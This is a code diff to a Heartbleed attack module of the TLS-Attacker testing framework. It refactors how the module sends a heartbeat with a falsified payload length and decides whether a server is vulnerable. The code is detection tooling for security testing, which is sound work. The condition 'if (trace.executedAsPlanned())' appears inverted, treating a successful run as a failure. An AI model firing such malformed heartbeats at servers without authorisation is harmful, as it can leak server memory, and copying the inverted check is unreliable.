@@ -24,6 +24,7 @@ import de.rub.nds.tlsattacker.core.state.TlsContext;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
+import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -60,8 +61,8 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
         payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
         ModifiableByteArray payload = new ModifiableByteArray();
         payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
-        HeartbeatMessage hb = (HeartbeatMessage) trace
-                .getFirstActuallySendMessageOfType(ProtocolMessageType.HEARTBEAT);
+        HeartbeatMessage hb = (HeartbeatMessage) WorkflowTraceUtil.getFirstSendMessage(ProtocolMessageType.HEARTBEAT,
+                trace);
         hb.setHeartbeatMessageType(heartbeatMessageType);
         hb.setPayload(payload);
         hb.setPayloadLength(payloadLength);
@@ -73,13 +74,11 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
             LOGGER.debug(ex);
         }
 
-        if (trace.getActuallyRecievedHandshakeMessagesOfType(HandshakeMessageType.FINISHED).isEmpty()) {
-            LOGGER.info("Correct TLS handshake cannot be executed, no Server Finished message found. Check the server configuration.");
+        if (trace.executedAsPlanned()) {
+            LOGGER.info("Could not execute Workflow correctly. Check the Debug log");
             return null;
         } else {
-            ProtocolMessage lastMessage = trace.getAllActuallyReceivedMessages().get(
-                    trace.getAllActuallyReceivedMessages().size() - 1);
-            if (lastMessage.getProtocolMessageType() == ProtocolMessageType.HEARTBEAT) {
+            if (WorkflowTraceUtil.didReceiveMessage(ProtocolMessageType.HEARTBEAT, trace)) {
                 LOGGER.info("Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid Length value");
                 return true;
             } else {
